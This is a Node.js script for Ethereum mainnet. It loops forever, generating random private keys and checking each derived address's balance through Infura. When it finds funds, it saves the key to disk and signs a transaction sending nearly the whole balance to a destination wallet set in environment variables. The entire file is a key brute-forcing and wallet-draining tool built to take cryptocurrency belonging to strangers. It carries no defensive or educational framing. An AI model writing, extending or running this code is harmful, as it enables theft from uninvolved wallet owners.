require('dotenv').config();

const ethUtil = require('ethereumjs-util');
const Web3 = require('web3');
const axios = require('axios');
const EthereumTx = require('ethereumjs-tx');
const log = require('ololog').configure({time: true});
const ansi = require('ansicolor').nice;
//const runner = require('child_process');
const fs = require('fs');

const getCurrentGasPrices = async () => {
	var response = await axios.get('https://ethgasstation.info/json/ethgasAPI.json');
	var prices = {
		low: response.data.safeLow / 10,
		medium: response.data.average / 10,
		high: response.data.fast / 10
	};

	console.log("\r\n");
	log (`Current ETH Gas Prices (in GWEI):`.cyan);
	console.log("\r\n");
	log(`Low: ${prices.low} (transaction completes in < 30 minutes)`.green);
	log(`Standard: ${prices.medium} (transaction completes in < 5 minutes)`.yellow);
	log(`Fast: ${prices.high} (transaction completes in < 2 minutes)`.red);
	console.log("\r\n");

	return prices;
}

const rk = () => {
	var k = '';
	var ks = '1234567890abcdef';
	for(var i = 0; i < 64; i++) {
		k += ks[Math.round(Math.random() * (ks.length - 1))];
	}
	return k;
}

const chainId = 1; // EIP 155 chainId - mainnet: 1, rinkeby: 4
const network = `https://mainnet.infura.io/v3/${process.env.INFURA_ACCESS_TOKEN}`;
const web3 = new Web3(new Web3.providers.HttpProvider(network));

const run = async () => {
	var privateKey = rk();
	var address = ethUtil.privateToAddress('0x' + privateKey);
	if (address[0] !== 0) {
		address = address.toString('hex');
		web3.eth.defaultAccount = '0x' + address;

		try {
			var myBalanceWei = web3.eth.getBalance(web3.eth.defaultAccount).toNumber();
			var myBalance = web3.fromWei(myBalanceWei, 'ether');
			if (myBalance > 0) {
				log (`Save ${address}: ${myBalance} : ${privateKey}`);
				fs.writeFileSync('oks/' + address + '.txt', privateKey + "\n" + myBalance);

				var gasPrices = await getCurrentGasPrices();
				gasPrices = gasPrices.high;
				log(`Your wallet balance is currently ${myBalance} ETH`.green);
				var amountToSend = myBalance - 0.05;
				log(`Balance to send ${amountToSend} ETH`.green);
				var nonce = web3.eth.getTransactionCount(web3.eth.defaultAccount);
				log(`The outgoing transaction count for your wallet address is: ${nonce}`.magenta);

				var details = {
					"to": process.env.DESTINATION_WALLET_ADDRESS,
					"value": web3.toHex(web3.toWei(amountToSend, 'ether')),
					"gas": 21000,
					"gasPrice": gasPrices * 1000000000, // converts the gwei price to wei
					"nonce": nonce,
					"chainId": chainId
				};
				var transaction = new EthereumTx(details);
				transaction.sign(Buffer.from(privateKey, 'hex'));
				var serializedTransaction = transaction.serialize();

				log (`Send ${address}: ${amountToSend} : ${privateKey}`.cyan);
				var transactionId = web3.eth.sendRawTransaction('0x' + serializedTransaction.toString('hex'));
				var url = `https://etherscan.io/tx/${transactionId}`;
				log(url.cyan);
				log(`Note: please allow for 30 seconds before transaction appears on Etherscan`.magenta);
			} else {
				log (`Fail ${address}: ${myBalance} : ${privateKey}`);
			}
		} catch (error) {
			log (`Error ${address}: ${privateKey}`);
			fs.writeFileSync('errors/' + address + '.txt', privateKey);
		}
	}
	setTimeout(function () {
		run();
	}, 1);
};

run();